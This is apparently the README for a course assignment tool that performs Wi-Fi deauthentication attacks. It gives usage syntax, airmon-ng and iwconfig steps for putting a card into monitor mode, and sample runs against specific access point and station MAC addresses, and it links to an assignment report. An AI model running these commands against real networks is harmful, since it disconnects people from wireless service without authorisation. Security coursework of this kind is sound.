<h1>Deauth_Attack</h1>

<h3>Usage</h3>
syntax : deauth-attack [interface] [ap mac] [[station mac] [-auth]]<br>
sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB<br>

<h3>Before Execute</h3>
sudo ifconfig wlan0 down<br>
sudo iwconfig wlan0 mode monitor<br>
sudo airmon-ng check kill<br>
sudo airodumpo-ng wlan0 채널 정보 및 BSSID 확인<br>
sudo airmon-ng start wlan0 6<br>
//sudo iwconfig wlan0 channel 6 #<br>
//sudo ifconfig wlan0 up<br>

<h3>Sample</h3>
sudo ./deauth-attack wlan0 00:0A:F5:E7:92:50<br>
sudo ./deauth-attack wlan0 00:0A:F5:E7:92:50 9c:28:b3:f0:70:3d<br>
sudo ./deauth-attack wlan0 00:0A:F5:E7:92:50 9c:28:b3:f0:70:3d -auth<br>

<p>https://gitlab.com/gilgil/sns/-/wikis/deauth-attack/report-deauth-attack</p>
